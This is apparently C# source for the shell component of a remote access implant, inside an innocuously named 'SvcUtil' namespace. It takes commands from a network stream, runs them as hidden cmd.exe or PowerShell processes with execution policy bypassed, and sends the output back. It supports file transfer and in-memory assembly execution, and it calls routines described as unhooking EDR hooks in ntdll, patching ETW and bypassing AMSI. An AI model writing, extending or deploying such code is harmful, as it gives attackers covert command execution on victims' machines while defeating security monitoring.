using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;

namespace SvcUtil
{
    internal static class Shell
    {
        // ── Session data ────────────────────────────────────────────

        internal sealed class SessionData
        {
            public IShellStream Stream;
            public string WorkDir;
            public volatile bool Running;
        }

        // ── Core entry point ────────────────────────────────────────

        /// <summary>
        /// Run a per-command loop: each line received from the stream
        /// is executed as a separate short-lived process.
        /// </summary>
        public static bool Execute(string commandLine, IShellStream stream,
                                    bool amsi = false,
                                    bool unhookNtdll = false)
        {
            // Ntdll unhooking — restore clean .text from disk
            // Removes ALL EDR inline hooks on ntdll (Nt* functions)
            if (unhookNtdll)
                NtdllUnhook.Run();

            // --amsi: ETW patch + HW breakpoint AMSI bypass
            // HW breakpoint = no code modification on amsi.dll
            if (amsi)
            {
                Ctx.A1();           // Patch EtwEventWrite → ret
                AmsiHwBp.Install(); // VEH + DR0 on AmsiScanBuffer
            }

            bool usePwsh = Ctx.Chk(commandLine);

            var session = new SessionData
            {
                Stream = stream,
                WorkDir = Environment.GetFolderPath(
                    Environment.SpecialFolder.UserProfile),
                Running = true
            };

            Prompt(session);

            // ── Command receive loop ────────────────────────────────
            byte[] buf = new byte[Config.BufferSize];
            var lb = new StringBuilder(512);

            while (session.Running && stream.Connected)
            {
                int n = stream.Receive(buf, 0, buf.Length);
                if (n <= 0) break;

                int seg = 0;
                for (int i = 0; i < n; i++)
                {
                    if (buf[i] == (byte)'\n' || buf[i] == (byte)'\r')
                    {
                        if (i > seg)
                            lb.Append(Encoding.UTF8.GetString(
                                buf, seg, i - seg));

                        string line = lb.ToString();
                        lb.Clear();
                        seg = i + 1;

                        string trimmed = line.Trim();
                        if (string.IsNullOrEmpty(trimmed)) continue;

                        // File transfer commands
                        if (FileTransfer.TryHandle(trimmed, stream))
                            continue;
#if EXEC_ASM
                        if (AssemblyRunner.TryHandle(trimmed, stream))
                            continue;
#endif
                        // Built-in commands (cd, exit)
                        if (Builtin(trimmed, session))
                        {
                            Prompt(session);
                            continue;
                        }

                        // Execute as short-lived process
                        Run(trimmed, session, usePwsh);
                        Prompt(session);
                    }
                }

                // Leftover data without newline
                if (seg < n)
                {
                    lb.Append(Encoding.UTF8.GetString(
                        buf, seg, n - seg));

                    if (lb.Length > Config.BufferSize)
                    {
                        string cmd = lb.ToString().Trim();
                        lb.Clear();
                        if (!string.IsNullOrEmpty(cmd))
                        {
                            Run(cmd, session, usePwsh);
                            Prompt(session);
                        }
                    }
                }
            }

            session.Running = false;
            try { stream.Close(); } catch { }
            return true;
        }

        // ── Built-in command handling ────────────────────────────────

        private static bool Builtin(string line, SessionData session)
        {
            // ── cd ──
            if (line.Equals("cd", StringComparison.OrdinalIgnoreCase) ||
                line.StartsWith("cd ", StringComparison.OrdinalIgnoreCase) ||
                line.StartsWith("cd\\", StringComparison.OrdinalIgnoreCase) ||
                line.StartsWith("cd/", StringComparison.OrdinalIgnoreCase))
            {
                string arg = line.Length > 2
                    ? line.Substring(2).Trim().Trim('"')
                    : null;

                if (string.IsNullOrEmpty(arg) || arg == "~")
                {
                    arg = Environment.GetFolderPath(
                        Environment.SpecialFolder.UserProfile);
                }

                if (!Path.IsPathRooted(arg))
                    arg = Path.Combine(session.WorkDir, arg);

                try
                {
                    arg = Path.GetFullPath(arg);
                    if (Directory.Exists(arg))
                        session.WorkDir = arg;
                    else
                        Out(session,
                            "The system cannot find the path specified.\r\n");
                }
                catch
                {
                    Out(session, "Invalid path.\r\n");
                }
                return true;
            }

            // ── exit / quit ──
            if (line.Equals("exit", StringComparison.OrdinalIgnoreCase) ||
                line.Equals("quit", StringComparison.OrdinalIgnoreCase))
            {
                session.Running = false;
                return true;
            }

            return false;
        }

        // ── Per-command execution ───────────────────────────────────

        private static void Run(string command, SessionData session,
                                 bool pwsh)
        {
            try
            {
                var psi = new ProcessStartInfo();

                if (pwsh)
                {
                    psi.FileName = "powershell.exe";
                    psi.Arguments = "-NoP -NonI -EP Bypass -C " + command;
                }
                else
                {
                    psi.FileName = "cmd.exe";
                    psi.Arguments = "/c " + command;
                }

                psi.WorkingDirectory = session.WorkDir;
                psi.UseShellExecute = false;
                psi.RedirectStandardOutput = true;
                psi.RedirectStandardError = true;
                psi.CreateNoWindow = true;

                using (var proc = Process.Start(psi))
                {
                    if (proc == null)
                    {
                        Out(session, "Failed to start process.\r\n");
                        return;
                    }

                    // Collect stderr in background to avoid deadlock
                    var errBuf = new StringBuilder();
                    proc.ErrorDataReceived += (s, e) =>
                    {
                        if (e.Data != null) errBuf.AppendLine(e.Data);
                    };
                    proc.BeginErrorReadLine();

                    // Stream stdout to remote as it arrives
                    byte[] rb = new byte[4096];
                    var stdOut = proc.StandardOutput.BaseStream;
                    int read;
                    while ((read = stdOut.Read(rb, 0, rb.Length)) > 0)
                    {
                        session.Stream.Send(rb, 0, read);
                    }

                    // Wait for process to finish
                    if (!proc.WaitForExit(30000))
                    {
                        try { proc.Kill(); } catch { }
                        Out(session, "\r\n[timeout]\r\n");
                    }

                    // Give ErrorDataReceived a moment to flush
                    Thread.Sleep(50);

                    // Send collected stderr after stdout
                    string err = errBuf.ToString();
                    if (err.Length > 0)
                        Out(session, err);
                }
            }
            catch (Exception ex)
            {
                Out(session, ex.Message + "\r\n");
            }
        }

        // ── Output helpers ──────────────────────────────────────────

        private static void Prompt(SessionData session)
        {
            Out(session, "\r\n" + session.WorkDir + "> ");
        }

        private static void Out(SessionData session, string text)
        {
            byte[] d = Encoding.UTF8.GetBytes(text);
            session.Stream.Send(d, 0, d.Length);
        }
    }
}
